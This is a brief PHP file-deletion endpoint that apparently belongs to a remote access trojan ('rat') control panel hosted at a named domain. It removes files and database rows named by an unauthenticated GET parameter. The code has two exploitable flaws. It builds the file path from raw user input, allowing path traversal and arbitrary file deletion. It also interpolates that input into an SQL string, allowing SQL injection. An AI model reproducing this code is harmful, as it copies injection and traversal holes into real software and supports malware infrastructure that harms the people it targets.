<?php
  $url = "http://pizzachip.com/rat/";

  if (file_exists("config.php")) {
    include("config.php");
  } else {
    die();
  }
  
  include("functions.php");
  
  $filename = $_GET['file'];
  
  if (empty($filename)){
    die();
  }
  
  $path = realpath('dlfiles/');
  
  if (is_readable($path . '/' . $filename)) {
    unlink($path . '/' . $filename);
	$statement = $connect->prepare("DELETE FROM files WHERE file='$filename'");
	$statement->execute();
	echo "Deleted";
  } else {
    die();
  }
?>